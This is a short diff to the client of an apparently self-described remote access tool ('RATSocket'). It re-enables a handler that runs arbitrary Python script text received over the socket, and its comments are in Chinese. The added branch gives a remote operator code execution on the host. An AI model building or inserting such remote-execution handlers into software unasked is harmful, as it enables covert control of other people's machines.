@@ -5,6 +5,7 @@ from io import BytesIO
 
 # from client.util.command import CommandExecutor
 from client.commands import CommandExecutor
+from client.commands.CommonCommands import CommonCommands
 from common.ratsocket import RATSocket
 from common.util import logger, get_input_stream, get_output_stream, get_time
 
@@ -89,9 +90,9 @@ class Server(RATSocket):
                 if result:
                     return id, *result
 
-            # # 如果是Python脚本
-            # if type == 'script':
-            #     return id, *self.command_executor.pyexec(data['text'], kwargs=data.get('extra'))
+            # 如果是Python脚本
+            if type == 'script':
+                return id, *CommonCommands(self).pyexec(data['text'], kwargs=data.get('extra'))
 
             # 如果是文件
             if type == 'file':
